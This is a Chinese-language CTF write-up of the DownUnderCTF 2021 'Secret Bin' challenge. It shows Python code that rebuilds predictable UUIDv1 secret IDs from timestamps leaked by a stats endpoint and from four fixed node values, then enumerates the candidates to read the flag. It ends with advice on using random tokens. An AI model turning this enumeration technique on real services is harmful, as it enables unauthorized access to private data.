# DownUnderCTF 2021 - Secret Bin

## 题目简述

服务用 UUIDv1 作为秘密的访问 ID，并声称无法猜测；但 `/api/stats` 泄露了初始秘密的创建时间，而 UUID 生成器只在四组固定的 `clock_seq` 与 `node` 之间随机选择。通过自行创建若干秘密收集这四种后缀，再与泄露时间做笛卡尔积，就能重建初始 UUID 并读取其中的 flag。

## 解题过程

### 拆解 UUIDv1 的可预测字段

UUIDv1 主要由以下字段组成：

- 60 位、单位为 100 ns 的时间戳；
- 版本号 1；
- 14 位时钟序列；
- 48 位节点值。

本题生成器并不使用未知机器信息，而是从四个硬编码 `(clock_seq, node)` 中随机选择：

```python
NODES = [
    (0x8421, 0x00155d1c46cb),
    (0x8b1e, 0x0401b7194601),
    (0x880f, 0x000d3acaef36),
    (0xbb4c, 0x0050568f00a9),
]
```

发布给选手的源码隐藏了具体列表，但每次 `POST /api/secret` 都返回新 UUID。连续创建约 24 个秘密，收集每个 UUID 最后 17 个字符，即可观察实际使用的 `clock_seq-node` 组合：

```python
samples = [create_secret() for _ in range(24)]
clock_and_node = {value[-17:] for value in samples}
```

若随机采样没有覆盖全部四种组合，继续创建即可。

### 由统计接口还原时间字段

`GET /api/stats` 返回 `stats.past_week`。这些值实际由初始 UUID 的时间戳转换成 Unix 秒：

```python
(uuid_value.time - 122192928000000000) / 10_000_000
```

反向计算 UUID 的 100 ns 时间戳：

$$
t_{uuid}=t_{unix}\times10^7+122192928000000000.
$$

JSON 浮点数可能丢失末尾精度，官方 solver 直接使用其十进制字符串，去掉小数点并补零到 17 位：

```python
def unix_float_to_uuid_time(value):
    digits = str(value).replace(".", "")
    digits += "0" * (17 - len(digits))
    return int(digits) + 122192928000000000
```

将 60 位时间戳按 UUIDv1 格式拆为 `time_low`、`time_mid` 和带版本位的 `time_hi_and_version`：

```python
def prefix_from_time(timestamp):
    raw = f"{timestamp:015x}"
    return "-".join([
        raw[-8:],
        raw[-12:-8],
        "1" + raw[:3],
    ])
```

### 枚举完整 UUID

对所有泄露时间和采样到的后缀做笛卡尔积：

```python
from itertools import product

candidates = []
for unix_time, suffix in product(past_week, clock_and_node):
    timestamp = unix_float_to_uuid_time(unix_time)
    candidates.append(prefix_from_time(timestamp) + "-" + suffix)
```

初始列表有 32 个时间戳、后缀最多四种，因此通常只需请求 $32\times4=128$ 个候选：

```python
for secret_id in candidates:
    response = requests.get(f"{BASE_URL}/api/secret/{secret_id}")
    if response.ok and response.text.startswith("DUCTF{"):
        print(response.text)
```

得到：

```text
DUCTF{cant_guess_this_one_9ed609c7-8978-4337-a7de-f618b859b998}
```

## 方法总结

UUIDv1 不是不可预测的访问令牌：它显式编码时间、时钟序列和节点。本题又通过统计接口泄露时间，并把剩余字段限制在四组固定值，使搜索空间降到约百次请求。秘密标识应由密码学安全随机源生成，例如 UUIDv4 或至少 128 位随机 token；统计接口也不应暴露足以重建内部对象标识的精确元数据。
